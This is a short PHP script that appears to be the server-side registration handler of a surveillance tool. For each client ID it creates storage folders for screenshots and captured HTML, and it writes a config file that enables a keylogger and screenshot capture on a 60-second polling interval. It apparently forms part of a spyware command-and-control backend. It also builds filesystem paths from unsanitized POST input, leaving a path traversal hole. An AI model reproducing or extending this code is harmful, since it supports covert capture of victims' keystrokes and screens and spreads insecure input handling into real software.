<?php
	$folder = "db/users/".$_POST["id_u"]."/"; 
	if(!is_dir($folder)){
		mkdir($folder);
		mkdir($folder."screenshots/");
		mkdir($folder."html/");
		$data_file = fopen($folder."config.php", "w");
		$hist_file = fopen($folder."history.php", "w");
		$config = array(	"id_u"			=>	$_POST["id_u"], 
							"tictac"		=>	60000,
							"let_img"		=>	1,
							"let_html"		=>	0,
							"let_keylogger"	=>	1);
		fclose($data_file);
		fclose($hist_file);
		file_put_contents($folder."config.php",  "<?php\n\t".'$__config__'." = " . var_export($config, true) . ";\n?>");
		file_put_contents($folder."history.php", "<?php\n\t".'$__history__'." = " . var_export(array(), true) . ";\n?>");
	}
?>